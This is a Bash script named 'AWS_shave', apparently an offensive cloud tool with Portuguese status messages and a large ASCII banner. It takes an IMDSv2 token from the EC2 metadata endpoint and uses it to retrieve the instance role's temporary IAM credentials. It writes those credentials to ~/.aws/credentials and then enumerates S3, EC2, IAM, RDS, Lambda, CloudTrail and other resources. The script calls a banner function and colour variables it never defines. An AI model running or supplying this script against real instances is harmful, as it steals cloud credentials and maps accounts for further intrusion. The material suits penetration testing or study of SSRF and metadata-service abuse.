#!/bin/bash

# ================== AWS_shave ==================

echo -e "\e[33m"
cat << "EOF"
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡤⠴⡿⠓⠶⠾⠿⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡖⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿⠖⠻⠷⡶⣮⡙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠉⠀⠀⠀⠀⠀⠀⠀⢀⣚⡯⠉⠀⠀⠀⠀⠀⠀⠀⠉⠛⢷⣄⣀⣀⣀⣀⣠⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠟⠀⠀⠀⠀⠀⠀⠀⢀⣰⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠀⠉⠉⠛⠿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⣾⣉⠳⠄⠀⠀⠀⠀⠀⠀⠀⠉⠻⢶⣄⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣅⡀⠉⠁⠀⠀⠀⠀⢠⣴⣤⡀⠀⠀⠀⠙⢷⣄⡀⠀⠀⠀⠀⠀  ██████   █████   █    ██ ▓█████ ▄▄▄       ██ ▄█▀     ▄▄▄█████▓ ██░ ██ ▓█████        ▄████▄   ██▓     ▒█████   █    ██ ▓█████▄
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣳⣾⠿⠁⠀⠀⠀⠀⠀⠀⠻⠿⠿⠟⠀⠀⠀⠀⠀⠉⠻⣦⠀⠀⠀⠀▒██    ▒ ▒██▓  ██▒ ██  ▓██▒▓█   ▀▒████▄     ██▄█▒      ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀       ▒██▀ ▀█  ▓██▒    ▒██▒  ██▒ ██  ▓██▒▒██▀ ██▌
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠖⠋⠁⢀⣼⡧⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢶⡿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣠⣤⣴⡒⠒⠶⣤⣿⠀⠀⠀⠀ ░ ▓██▄   ▒██▒  ██░▓██  ▒██░▒███  ▒██  ▀█▄  ▓███▄░      ▒ ▓██░ ▒░▒██▀▀██░▒███         ▒▓█    ▄ ▒██░    ▒██░  ██▒▓██  ▒██░░██   █▌
    ⠀⠀⠀⠀⠀⠀⠀⢀⡴⠏⠁⠀⢀⣠⣼⡟⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣤⠀⠀⠀⠤⠖⠚⠉⠉⣀⡠⠤⠒⢲⡆⠁⢀⡴⢩⡿⢤⡀⠀⠀   ▒   ██▒░██  █▀ ░▓▓█  ░██░▒▓█  ▄░██▄▄▄▄██ ▓██ █▄ ░      ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄       ▒▓▓▄ ▄██▒▒██░    ▒██   ██░▓▓█  ░██░░▓█▄   ▌
    ⠀⠀⠀⠀⠀⢀⣴⠋⠀⢀⣴⠞⠋⠉⢸⡇⠀⠀⠀⠀⠀⠀⠀⢽⣟⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠴⠋⠀⠀⠀⠀⠀⢀⡠⠖⠋⠁⢀⣤⣾⣥⠤⠴⠛⠋⠉⠙⣆⠉⠢⡄ ▒██████▒▒░▒███▒█▄ ▒▒█████▓ ░▒████▒▓█   ▓██▒▒██▒ █▄       ▒██▒ ░ ░▓█▒░██▓░▒████▒      ▒ ▓███▀ ░░██████▒░ ████▓▒░▒▒█████▓ ░▒████▓ 
    ⠀⠀⠀⠀⣠⠟⠁⢠⡾⠋⠁⠀⠀⠀⣼⡇⠀⡀⠀⠀⠀⠀⠀⢰⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔⠋⠀⠀⠀⢠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠈ ▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒ ░░ ▒░ ░▒▒   ▓▒█░▒ ▒▒ ▓▒       ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░      ░ ░▒ ▒  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒  ▒▒▓  ▒
    ⠀⠀⠀⣴⠋⢀⡴⠋⠀⠀⠀⠀⠀⠀⣿⠿⢛⣣⣄⣀⡀⠀⠀⠀⢨⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢠⣄⣴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀ ░ ░▒  ░ ░ ░ ▒░  ░ ░░▒░ ░ ░  ░ ░  ░ ▒   ▒▒ ░░ ░▒ ▒░         ░     ▒ ░▒░ ░ ░ ░  ░        ░  ▒   ░ ░ ▒  ░  ░ ▒ ▒░ ░░▒░ ░ ░  ░ ▒  ▒
    ⠀⠀⣼⠇⢀⡟⠁⠀⠀⠀⠀⠀⠀⠰⣿⠀⠈⠈⢻⣟⠉⠉⠉⠉⠉⠛⠻⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⢠⣶⠏⢸⠛⠛⠒⢲⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ░  ░  ░     ░   ░  ░░░ ░ ░    ░    ░   ▒   ░ ░░ ░        ░       ░  ░░ ░   ░         ░          ░ ░   ░ ░ ░ ▒   ░░░ ░ ░  ░ ░  ░ 
    ⠀⢠⡟⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⡀⣿⣷⣄⠀⠀⠀⠀⠀⠀⠙⠿⣿⣀⢀⣀⣤⣄⠀⠀⠀⠀⣀⣀⣾⣿⣿⣄⣠⣏⠀⠀⠀⠺⣯⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀       ░      ░       ░        ░  ░     ░  ░░  ░                  ░  ░  ░   ░  ░      ░ ░          ░  ░    ░ ░     ░        ░  
    ⠀⣸⡇⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠘⣷⣤⢹⣄⢻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠻⣯⣤⣴⣦⣾⠷⣿⡋⠀⠀⠈⠉⢹⣿⣦⣿⠛⢷⣬⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                                          ░                                   ░  
    ⠀⣿⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⡏⠙⢿⠟⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣯⡀⠀⠀⠈⢿⡷⣦⡀⠀⢸⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⢻⡇⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡏⠀⣇⠘⡆⢳⣬⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⣸⡇⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡾⢻⣶⠿⣶⡏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⣿⠃⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠁⠀⠉⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⣼⣏⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⣼⣿⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

EOF
echo -e "\e[0m"

get_token() {
  curl -sX PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" --max-time 3 --retry 3
}

get_iam_role() {
  curl -s -H "X-aws-ec2-metadata-token: $1" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -n1
}

get_credentials() {
  curl -s -H "X-aws-ec2-metadata-token: $1" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/$2
}

export_credentials() {
  creds=$1
  export AWS_ACCESS_KEY_ID=$(echo "$creds" | jq -r .AccessKeyId)
  export AWS_SECRET_ACCESS_KEY=$(echo "$creds" | jq -r .SecretAccessKey)
  export AWS_SESSION_TOKEN=$(echo "$creds" | jq -r .Token)

  mkdir -p ~/.aws
  cat > ~/.aws/credentials <<EOF
[default]
aws_access_key_id = $AWS_ACCESS_KEY_ID
aws_secret_access_key = $AWS_SECRET_ACCESS_KEY
aws_session_token = $AWS_SESSION_TOKEN
EOF
}

list_aws_resources() {
  echo -e "${CYAN}Enumerando recursos AWS...${RESET}"

  aws s3 ls
  aws ec2 describe-instances
  aws ec2 describe-volumes
  aws ec2 describe-snapshots
  aws ec2 describe-security-groups
  aws dynamodb list-tables
  aws sqs list-queues
  aws sns list-topics
  aws lambda list-functions
  aws logs describe-log-groups
  aws rds describe-db-instances
  aws iam list-users
  aws iam list-groups
  aws iam list-roles
  aws cloudformation list-stacks
  aws ecs list-clusters
  aws eks list-clusters
  aws ec2 describe-subnets
  aws ec2 describe-route-tables
  aws ec2 describe-internet-gateways
  aws cloudtrail list-trails
}

run_aws_shave() {
  print_banner_aws

  echo -e "${BLUE}[*] Obtendo token IMDS...${RESET}"
  TOKEN=$(get_token)
  if [[ -z "$TOKEN" ]]; then
    echo -e "${RED}[X] Erro: Não foi possível obter o token do IMDS.${RESET}"
    exit 1
  fi
  echo -e "${GREEN}[+] Token obtido com sucesso.${RESET}"

  echo -e "${BLUE}[*] Buscando Role IAM vinculada...${RESET}"
  iam_role=$(get_iam_role "$TOKEN")
  if [[ -z "$iam_role" ]]; then
    echo -e "${RED}[X] Erro: Não foi possível obter a Role IAM.${RESET}"
    exit 1
  fi
  echo -e "${GREEN}[+] Role IAM: $iam_role${RESET}"

  echo -e "${BLUE}[*] Coletando Credenciais...${RESET}"
  credentials=$(get_credentials "$TOKEN" "$iam_role")
  if [[ -z "$credentials" ]]; then
    echo -e "${RED}[X] Erro: Não foi possível obter as credenciais.${RESET}"
    exit 1
  fi
  echo -e "${GREEN}[+] Credenciais obtidas com sucesso.${RESET}"

  export_credentials "$credentials"

  echo -e "${YELLOW}[!] Iniciando enumeração dos recursos AWS...${RESET}"
  list_aws_resources

  echo -e "${GREEN}[✓] Enumeração AWS finalizada.${RESET}"
}

# Chamada da função principal para rodar o script
run_aws_shave